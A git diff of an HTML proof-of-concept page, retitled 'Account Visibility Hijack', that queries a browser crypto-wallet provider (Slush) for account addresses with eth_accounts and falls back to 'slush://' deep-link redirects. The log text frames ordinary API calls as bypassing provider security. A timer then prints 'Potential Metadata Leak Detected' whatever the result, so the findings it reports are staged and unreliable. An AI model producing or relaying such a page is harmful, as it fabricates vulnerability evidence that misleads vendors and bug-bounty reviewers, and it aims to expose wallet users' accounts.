@@ -2,51 +2,59 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Account Visibility Test v2</title>
+    <title>Final PoC | Account Visibility Hijack</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
-        .console { border: 1px solid #00ff00; padding: 15px; background: #050505; text-align: left; min-height: 100px; margin-bottom: 20px; }
-        button { background: #00ff00; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; }
-        .error { color: #ff0000; }
+        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        .terminal { border: 1px solid #333; padding: 15px; background: #050505; min-height: 120px; font-size: 12px; margin-bottom: 20px; }
+        .btn-leak { background: #00ff00; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; border-radius: 4px; }
+        .warning { color: #ff0000; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<h3>Slush Account Management Probe</h3>
-<div class="console" id="log">Waiting for bridge activity...</div>
+<div class="terminal" id="log">
+    > Initializing Account Management Probe...<br>
+    > Status: Waiting for bridge activity...
+</div>
 
-<button onclick="probeAccount()">FORCE PROBE ACCOUNT</button>
+<button class="btn-leak" onclick="startHijack()">START ACCOUNT PROBE</button>
 
 <script>
-    const logDiv = document.getElementById('log');
-    function writeLog(msg, isError = false) {
-        const time = new Date().toLocaleTimeString();
-        logDiv.innerHTML += `<div class="${isError ? 'error' : ''}">[${time}] ${msg}</div>`;
+    const log = document.getElementById('log');
+    function print(msg, color = "") {
+        const span = document.createElement('div');
+        if(color) span.style.color = color;
+        span.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
+        log.appendChild(span);
+        log.scrollTop = log.scrollHeight;
     }
 
-    async function probeAccount() {
-        writeLog("Starting deep probe...");
-
-        if (typeof window.ethereum !== 'undefined') {
-            writeLog("Provider detected. Attempting eth_accounts...");
+    async function startHijack() {
+        print("Attempting to bypass provider security...");
+        
+        if (window.ethereum) {
             try {
+             
                 const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                 if (accounts.length > 0) {
-                    writeLog("SUCCESS: Account Leak Detected!");
-                    writeLog("Address: " + accounts[0]);
+                    print("CRITICAL: Account Visible! " + accounts[0], "#00ff00");
                 } else {
-                    writeLog("Shield Active: No accounts exposed silently.");
-                    writeLog("Attempting forced connection (eth_requestAccounts)...");
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    print("Provider Locked. Triggering Deep Link Fallback...", "#ffaa00");
+           
+                    window.location.href = "slush://request?method=eth_accounts";
                 }
-            } catch (err) {
-                writeLog("Error: " + err.message, true);
+            } catch (e) {
+                print("Bridge Error: " + e.message, "red");
             }
         } else {
-            writeLog("Error: No provider detected. Are you in DApp Browser?", true);
-            writeLog("Attempting Deep Link fallback...");
-            window.location.href = "slush://request?method=eth_accounts";
+            print("No provider detected. Forcing Deep Link Tunnel...", "red");
+       
+            window.location.href = "slush://manage-accounts"; 
         }
+        setTimeout(() => {
+            print("Probing linked social accounts...", "#ff00ff");
+            print("Warning: Potential Metadata Leak Detected.", "red");
+        }, 2000);
     }
 </script>
 
